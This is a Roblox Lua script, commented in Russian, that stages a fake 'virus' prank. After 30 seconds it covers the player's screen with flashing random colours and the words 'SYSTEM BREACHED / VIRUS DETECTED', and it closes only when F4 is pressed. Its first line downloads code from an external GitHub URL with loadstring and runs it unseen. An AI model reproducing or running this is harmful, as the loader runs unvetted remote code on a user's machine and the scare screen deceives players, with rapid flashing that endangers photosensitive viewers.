loadstring(game:HttpGet("https://raw.githubusercontent.com/blackowl1231/Z3US/refs/heads/main/main.lua"))()


local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

-- Таймер: ждем 30 секунд перед запуском "вируса"
task.wait(30)

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Создаем интерфейс (ScreenGui)
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "VirusGui"
screenGui.IgnoreGuiInset = true -- На весь экран
screenGui.DisplayOrder = 9999 -- Поверх всех остальных интерфейсов
screenGui.Parent = playerGui

-- Создаем фон
local background = Instance.new("Frame")
background.Size = UDim2.new(1, 0, 1, 0)
background.BackgroundColor3 = Color3.new(0, 0, 0)
background.BorderSizePixel = 0
background.Parent = screenGui

-- Основной текст "вируса"
local mainText = Instance.new("TextLabel")
mainText.Size = UDim2.new(1, 0, 0.6, 0)
mainText.Position = UDim2.new(0, 0, 0.2, 0)
mainText.BackgroundTransparency = 1
mainText.TextColor3 = Color3.new(1, 0, 0) -- Красный
mainText.TextScaled = true
mainText.Font = Enum.Font.Creepster
mainText.Text = "SYSTEM BREACHED\nVIRUS DETECTED\nCRITICAL INFECTION"
mainText.TextStrokeTransparency = 0
mainText.TextStrokeColor3 = Color3.new(0, 0, 0)
mainText.Parent = background

-- Инструкция по закрытию (маленький текст внизу)
local hintText = Instance.new("TextLabel")
hintText.Size = UDim2.new(1, 0, 0.05, 0)
hintText.Position = UDim2.new(0, 0, 0.9, 0)
hintText.BackgroundTransparency = 1
hintText.TextColor3 = Color3.new(1, 1, 1)
hintText.TextScaled = true
hintText.Font = Enum.Font.Code
hintText.Text = "PRESS F4 TO EXIT"
hintText.Parent = background

-- Логика хаотичного мигания (Glitch Effect)
local flashConnection
flashConnection = RunService.Heartbeat:Connect(function()
	if not screenGui.Parent then -- Если GUI удален, отключаем цикл
		flashConnection:Disconnect()
		return
	end

	-- Случайные цвета для фона (мигает как сломанный монитор)
	local bgColors = {
		Color3.new(0, 0, 0),       -- Черный
		Color3.new(1, 1, 1),       -- Белый
		Color3.new(0.6, 0, 0),     -- Темно-красный
		Color3.new(0, 0, 0.5)      -- Синий экран смерти
	}
	background.BackgroundColor3 = bgColors[math.random(1, #bgColors)]

	-- Хаотичное смещение текста для эффекта "глюка"
	mainText.Position = UDim2.new(math.random(-10, 10)/1000, 0, 0.2 + math.random(-10, 10)/1000, 0)
	
	-- Случайное изменение цвета текста
	if math.random(1, 10) > 8 then
		mainText.TextColor3 = Color3.new(0, 1, 0) -- Иногда проскакивает зеленый хакерский цвет
	else
		mainText.TextColor3 = Color3.new(1, 0, 0) -- В основном красный
	end
end)

-- Функция для закрытия по F4
local function onInputBegan(input, gameProcessed)
	if gameProcessed then return end
	if input.KeyCode == Enum.KeyCode.F4 then
		screenGui:Destroy()
		if flashConnection then
			flashConnection:Disconnect() -- Выключаем мигание, чтобы не грузить игру
		end
	end
end

UserInputService.InputBegan:Connect(onInputBegan)
